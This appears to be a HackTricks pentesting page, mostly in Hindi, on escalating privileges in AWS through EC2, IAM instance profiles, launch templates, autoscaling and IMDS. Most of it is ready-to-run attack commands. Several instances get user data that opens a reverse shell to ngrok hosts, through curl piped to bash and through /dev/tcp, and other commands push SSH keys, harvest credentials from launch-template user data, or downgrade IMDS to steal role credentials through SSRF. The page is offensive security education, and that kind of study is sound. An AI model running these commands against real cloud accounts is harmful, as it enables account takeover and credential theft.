# AWS - EC2 Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## EC2

EC2 के बारे में अधिक **जानकारी** के लिए देखें:

{{#ref}}
../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/
{{#endref}}

### `iam:PassRole`, `ec2:RunInstances`

एक attacker **एक instance बना सकता है जिसमें एक IAM role attach किया गया हो और फिर उस instance में access कर सकता है** ताकि वह metadata endpoint से IAM role credentials चुरा सके।

- **SSH के माध्यम से पहुँच**

एक नया instance चलाएं जो **बनाई गई** **ssh key** (`--key-name`) का उपयोग करता हो और फिर उस पर ssh करें (यदि आप एक नई key बनाना चाहते हैं तो आपको `ec2:CreateKeyPair` अनुमति की आवश्यकता हो सकती है)।
```bash
aws ec2 run-instances --image-id <img-id> --instance-type t2.micro \
--iam-instance-profile Name=<instance-profile-name> --key-name <ssh-key> \
--security-group-ids <sg-id>
```
- **rev shell के जरिए user data में एक्सेस**

आप **user data** (`--user-data`) का उपयोग करके एक नया instance चला सकते हैं जो आपको एक **rev shell** भेजेगा। इस तरह आपको security group निर्दिष्ट करने की आवश्यकता नहीं है।
```bash
echo '#!/bin/bash
curl https://reverse-shell.sh/4.tcp.ngrok.io:17031 | bash' > /tmp/rev.sh

aws ec2 run-instances --image-id <img-id> --instance-type t2.micro \
--iam-instance-profile Name=<instance-profile-name> \
--count 1 \
--user-data "file:///tmp/rev.sh"
```
यदि आप IAM role के credentials को instance के बाहर उपयोग करते हैं तो GuradDuty के साथ सावधान रहें:

{{#ref}}
../../aws-services/aws-security-and-detection-services/aws-guardduty-enum.md
{{#endref}}

**Potential Impact:** existing instance profiles से जुड़े किसी भी EC2 role पर Direct privesc।

#### Privesc to ECS

इन permissions के साथ आप **एक EC2 instance बना कर उसे किसी ECS cluster के अंदर register कर सकते हैं**। इस तरह, वे ECS **services** उसी **EC2 instance** पर **run** होंगी जहां आपका access है, और तब आप उन services (docker containers) में penetrate कर सकते हैं और उनके साथ जुड़ी **ECS roles** **steal** कर सकते हैं।
```bash
aws ec2 run-instances \
--image-id ami-07fde2ae86109a2af \
--instance-type t2.micro \
--iam-instance-profile <ECS_role> \
--count 1 --key-name pwned \
--user-data "file:///tmp/asd.sh"

# Make sure to use an ECS optimized AMI as it has everything installed for ECS already (amzn2-ami-ecs-hvm-2.0.20210520-x86_64-ebs)
# The EC2 instance profile needs basic ECS access
# The content of the user data is:
#!/bin/bash
echo ECS_CLUSTER=<cluster-name> >> /etc/ecs/ecs.config;echo ECS_BACKEND_HOST= >> /etc/ecs/ecs.config;
```
To learn how to **force ECS services to be run** in this new EC2 instance check:

{{#ref}}
../aws-ecs-privesc/README.md
{{#endref}}

If you **cannot create a new instance** but has the permission `ecs:RegisterContainerInstance` you might be able to register the instance inside the cluster and perform the commented attack.

**Potential Impact:** Direct privesc to ECS roles attached to tasks.

### **`iam:PassRole`,** **`iam:AddRoleToInstanceProfile`**

Similar to the previous scenario, an attacker with these permissions could **change the IAM role of a compromised instance** so he could steal new credentials.\
As an instance profile can only have 1 role, if the instance profile **already has a role** (common case), you will also need **`iam:RemoveRoleFromInstanceProfile`**.
```bash
# Removing role from instance profile
aws iam remove-role-from-instance-profile --instance-profile-name <name> --role-name <name>

# Add role to instance profile
aws iam add-role-to-instance-profile --instance-profile-name <name> --role-name <name>
```
यदि **instance profile has a role** और हमलावर **cannot remove it**, तो एक और workaround है। वह **find** an **instance profile without a role** or **create a new one** (`iam:CreateInstanceProfile`), **add** the **role** to that **instance profile** (as previously discussed), and **associate the instance profile** compromised to a compromised i**nstance:**

- यदि the instance **doesn't have any instance** profile (`ec2:AssociateIamInstanceProfile`)
```bash
aws ec2 associate-iam-instance-profile --iam-instance-profile Name=<value> --instance-id <value>
```
**संभावित प्रभाव:** Direct privesc to a different EC2 role (आपको पहले एक AWS EC2 instance compromise किया हुआ होना चाहिए और कुछ अतिरिक्त permission या specific instance profile status की आवश्यकता होगी).

### **`iam:PassRole`((** `ec2:AssociateIamInstanceProfile`& `ec2:DisassociateIamInstanceProfile`) || `ec2:ReplaceIamInstanceProfileAssociation`)

इन permissions के साथ यह संभव है कि आप किसी instance से जुड़ा instance profile बदल सकें, इसलिए यदि attacker के पास पहले से किसी instance की access है, तो वह जुड़े हुए instance profile को बदलकर और भी instance profile roles के credentials चोरी कर सकेगा।

- यदि इसमें **instance profile** है, तो आप instance profile को **remove** (`ec2:DisassociateIamInstanceProfile`) कर सकते हैं और उसे **associate** कर सकते हैं।
```bash
aws ec2 describe-iam-instance-profile-associations --filters Name=instance-id,Values=i-0d36d47ba15d7b4da
aws ec2 disassociate-iam-instance-profile --association-id <value>
aws ec2 associate-iam-instance-profile --iam-instance-profile Name=<value> --instance-id <value>
```
- या समझौता किए गए इंस्टेंस की **इंस्टेंस प्रोफ़ाइल** **बदलें** (`ec2:ReplaceIamInstanceProfileAssociation`).
```bash
aws ec2 replace-iam-instance-profile-association --iam-instance-profile Name=<value> --association-id <value>
```
**संभावित प्रभाव:** सीधा privesc एक अलग EC2 role पर (आपको पहले किसी AWS EC2 instance को compromise कर लिया होना चाहिए और कुछ अतिरिक्त अनुमति या specific instance profile status की आवश्यकता होगी).

### `ec2:RequestSpotInstances`,`iam:PassRole`

एक हमलावर जिसके पास अनुमतियाँ **`ec2:RequestSpotInstances` और `iam:PassRole`** हैं, वह **request** कर सकता है एक **Spot Instance** जिसमें **EC2 Role attached** हो और **rev shell** हो **user data** में.\  
एक बार instance चल जाने पर, वह **IAM role** चुरा सकता है।
```bash
REV=$(printf '#!/bin/bash
curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | bash
' | base64)

aws ec2 request-spot-instances \
--instance-count 1 \
--launch-specification "{\"IamInstanceProfile\":{\"Name\":\"EC2-CloudWatch-Agent-Role\"}, \"InstanceType\": \"t2.micro\", \"UserData\":\"$REV\", \"ImageId\": \"ami-0c1bc246476a5572b\"}"
```
### `ec2:ModifyInstanceAttribute`

जिस हमलावर के पास **`ec2:ModifyInstanceAttribute`** अनुमति है वह instance के attributes को संशोधित कर सकता है। इनके बीच वह **user data** बदल सकता है, जिसका मतलब है कि वह instance को **arbitrary data चलाने** के लिए मजबूर कर सकता है, जिसका उपयोग EC2 instance पर एक **rev shell** पाने के लिए किया जा सकता है।

ध्यान दें कि attributes केवल तब ही **संशोधित** किए जा सकते हैं जब instance बंद हो, इसलिए आवश्यक **permissions** हैं **`ec2:StopInstances`** और **`ec2:StartInstances`**।
```bash
TEXT='Content-Type: multipart/mixed; boundary="//"
MIME-Version: 1.0

--//
Content-Type: text/cloud-config; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="cloud-config.txt"

#cloud-config
cloud_final_modules:
- [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="userdata.txt"

#!/bin/bash
bash -i >& /dev/tcp/2.tcp.ngrok.io/14510 0>&1
--//'
TEXT_PATH="/tmp/text.b64.txt"

printf $TEXT | base64 > "$TEXT_PATH"

aws ec2 stop-instances --instance-ids $INSTANCE_ID

aws ec2 modify-instance-attribute \
--instance-id="$INSTANCE_ID" \
--attribute userData \
--value file://$TEXT_PATH

aws ec2 start-instances --instance-ids $INSTANCE_ID
```
**Potential Impact:** किसी बनाए गए instance से जुड़े किसी भी EC2 IAM Role पर सीधे privesc।

### `ec2:CreateLaunchTemplateVersion`,`ec2:CreateLaunchTemplate`,`ec2:ModifyLaunchTemplate`

जिस attacker के पास permissions **`ec2:CreateLaunchTemplateVersion`,`ec2:CreateLaunchTemplate`and `ec2:ModifyLaunchTemplate`** हों, वह एक **new Launch Template version** बना सकता है जिसमें **rev shell in** the **user data** और **any EC2 IAM Role on it**, default version बदल सकता है, और कोई भी **Autoscaler group** **using** that **Launch Templat**e that is **configured** to use the **latest** or the **default version** will **re-run the instances** using that template and will execute the rev shell।
```bash
REV=$(printf '#!/bin/bash
curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | bash
' | base64)

aws ec2 create-launch-template-version \
--launch-template-name bad_template \
--launch-template-data "{\"ImageId\": \"ami-0c1bc246476a5572b\", \"InstanceType\": \"t3.micro\", \"IamInstanceProfile\": {\"Name\": \"ecsInstanceRole\"}, \"UserData\": \"$REV\"}"

aws ec2 modify-launch-template \
--launch-template-name bad_template \
--default-version 2
```
**संभावित प्रभाव:** Direct privesc to a different EC2 role.

### (`autoscaling:CreateLaunchConfiguration` | `ec2:CreateLaunchTemplate`),  `iam:PassRole`, (`autoscaling:CreateAutoScalingGroup` | `autoscaling:UpdateAutoScalingGroup`)

उन अनुमतियों **`autoscaling:CreateLaunchConfiguration`,`autoscaling:CreateAutoScalingGroup`,`iam:PassRole`** के साथ एक attacker **create a Launch Configuration** कर सकता है जिसमें एक **IAM Role** और एक **rev shell** **user data** के अंदर हो, फिर उस config से एक **autoscaling group** बना कर rev shell के द्वारा **IAM Role को चुराने** का इंतज़ार कर सकता है।
```bash
aws --profile "$NON_PRIV_PROFILE_USER" autoscaling create-launch-configuration \
--launch-configuration-name bad_config \
--image-id ami-0c1bc246476a5572b \
--instance-type t3.micro \
--iam-instance-profile EC2-CloudWatch-Agent-Role \
--user-data "$REV"

aws --profile "$NON_PRIV_PROFILE_USER" autoscaling create-auto-scaling-group \
--auto-scaling-group-name bad_auto \
--min-size 1 --max-size 1 \
--launch-configuration-name bad_config \
--desired-capacity 1 \
--vpc-zone-identifier "subnet-e282f9b8"
```
**संभावित प्रभाव:** एक अलग EC2 role पर सीधे privesc।

### `!autoscaling`

Permissions का सेट **`ec2:CreateLaunchTemplate`** और **`autoscaling:CreateAutoScalingGroup`** **IAM role पर privileges escalate करने के लिए पर्याप्त नहीं है** क्योंकि Launch Configuration या Launch Template में निर्दिष्ट role को attach करने के लिए **आपको permissions `iam:PassRole` और `ec2:RunInstances`** की आवश्यकता होती है (जो एक ज्ञात privesc है)।

### `ec2-instance-connect:SendSSHPublicKey`

जिस attacker के पास permission **`ec2-instance-connect:SendSSHPublicKey`** है, वह किसी user में एक ssh key जोड़ सकता है और यदि उसके पास instance का ssh access है तो इसका उपयोग उस instance में लॉगिन करने या privileges escalate करने के लिए कर सकता है।
```bash
aws ec2-instance-connect send-ssh-public-key \
--instance-id "$INSTANCE_ID" \
--instance-os-user "ec2-user" \
--ssh-public-key "file://$PUBK_PATH"
```
**Potential Impact:** चल रही instances से जुड़े EC2 IAM roles पर सीधा privesc।

### `ec2-instance-connect:SendSerialConsoleSSHPublicKey`

यदि किसी attacker के पास permission **`ec2-instance-connect:SendSerialConsoleSSHPublicKey`** है तो वह **serial connection में एक ssh key जोड़ सकता है**। अगर serial सक्षम नहीं है, तो attacker को इसे सक्षम करने के लिए permission **`ec2:EnableSerialConsoleAccess`** की आवश्यकता होगी।

serial port से कनेक्ट करने के लिए आपको मशीन के अंदर किसी user का **username और password जानना** भी आवश्यक होगा।
```bash
aws ec2 enable-serial-console-access

aws ec2-instance-connect send-serial-console-ssh-public-key \
--instance-id "$INSTANCE_ID" \
--serial-port 0 \
--region "eu-west-1" \
--ssh-public-key "file://$PUBK_PATH"

ssh -i /tmp/priv $INSTANCE_ID.port0@serial-console.ec2-instance-connect.eu-west-1.aws
```
This way isn't that useful to privesc as you need to know a username and password to exploit it.

**Potential Impact:** (बहुत ही अनप्रमाणनीय) यह running instances से जुड़े EC2 IAM roles तक सीधे privesc कर सकता है।

### `describe-launch-templates`,`describe-launch-template-versions`

चूंकि launch templates में versioning होता है, एक attacker जिसके पास **`ec2:describe-launch-templates`** और **`ec2:describe-launch-template-versions`** permissions हों, वे इन्हें exploit करके संवेदनशील जानकारी खोज सकते हैं, जैसे user data में मौजूद credentials। इसे करने के लिए, निम्नलिखित script उपलब्ध launch templates के सभी versions के माध्यम से loop करता है:
```bash
for i in $(aws ec2 describe-launch-templates --region us-east-1 | jq -r '.LaunchTemplates[].LaunchTemplateId')
do
echo "[*] Analyzing $i"
aws ec2 describe-launch-template-versions --launch-template-id $i --region us-east-1 | jq -r '.LaunchTemplateVersions[] | "\(.VersionNumber) \(.LaunchTemplateData.UserData)"' | while read version userdata
do
echo "VersionNumber: $version"
echo "$userdata" | base64 -d
echo
done | grep -iE "aws_|password|token|api"
done
```
In the above commands, although we're specifying certain patterns (`aws_|password|token|api`), you can use a different regex to search for other types of sensitive information.

Assuming we find `aws_access_key_id` and `aws_secret_access_key`, we can use these credentials to authenticate to AWS.

**संभावित प्रभाव:** Direct privilege escalation to IAM user(s).

## संदर्भ

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

{{#include ../../../../banners/hacktricks-training.md}}




### `ec2:ModifyInstanceMetadataOptions` (IMDS downgrade to enable SSRF credential theft)

जिस हमलावर के पास किसी पीड़ित EC2 instance पर `ec2:ModifyInstanceMetadataOptions` कॉल करने की क्षमता है, वह IMDS protections को कमजोर कर सकता है — IMDSv1 सक्षम करके (`HttpTokens=optional`) और `HttpPutResponseHopLimit` बढ़ाकर। इससे instance metadata endpoint आम SSRF/proxy paths के माध्यम से उन applications से पहुंच योग्य हो जाता है जो instance पर चल रही हों। यदि हमलावर ऐसे किसी ऐप में SSRF ट्रिगर कर सके, तो वह instance profile credentials प्राप्त कर सकता है और उनके साथ pivot कर सकता है।

- आवश्यक permissions: `ec2:ModifyInstanceMetadataOptions` लक्ष्य instance पर (साथ ही host पर SSRF पहुंच/trigger करने की क्षमता)।
- लक्ष्य resource: चल रही EC2 instance जिस पर attached instance profile (IAM role) हो।

Commands example:
```bash
# 1) Check current metadata settings
aws ec2 describe-instances --instance-id <INSTANCE_ID> \
--query 'Reservations[0].Instances[0].MetadataOptions'

# 2) Downgrade IMDS protections (enable IMDSv1 and raise hop limit)
aws ec2 modify-instance-metadata-options --instance-id <INSTANCE_ID> \
--http-endpoint enabled --http-tokens optional \
--http-put-response-hop-limit 3 --instance-metadata-tags enabled

# 3) Through the SSRF, enumerate role name
curl "http://<VICTIM_PUBLIC_IP>:<APP_PORT>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# 4) Through the SSRF, steal the temporary credentials
curl "http://<VICTIM_PUBLIC_IP>:<APP_PORT>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>"

# 5) Use the stolen credentials
export AWS_ACCESS_KEY_ID=<AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
export AWS_SESSION_TOKEN=<Token>
aws sts get-caller-identity

# 6) Restore protections (require IMDSv2, low hop limit)
aws ec2 modify-instance-metadata-options --instance-id <INSTANCE_ID> \
--http-tokens required --http-put-response-hop-limit 1
```
संभावित प्रभाव: SSRF के माध्यम से instance profile credentials की चोरी, जो EC2 role permissions के साथ privilege escalation और lateral movement की ओर ले जाती है।
